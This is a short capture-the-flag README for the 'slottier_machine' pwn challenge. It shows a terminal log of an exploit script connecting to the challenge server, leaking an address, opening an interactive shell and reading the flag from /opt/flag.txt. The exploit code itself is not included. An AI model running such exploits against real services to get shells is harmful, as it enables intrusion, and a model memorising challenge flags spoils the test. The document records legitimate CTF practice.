# slottier_machine archive and exploit

```
n0psledbyte@n0psledbyte ~/repo_git/CTF/PWN-2018/pwn/slottiermachine [master *]
± % python exploit.py                                                                                                                                                                      !10090
[+] Opening connection to slottiermachine.uni.hctf.fun on port 13371: Done
0x7ff75490e000
[*] Switching to interactive mode
$ ls
bin
etc
lib
lib64
opt
usr
$ cat flag.txt
cat: can't open 'flag.txt': No such file or directory
$ cat /opt/flag.txt
flag{6c2ac0cc1a7b06bab03af4022047b1bd}
```
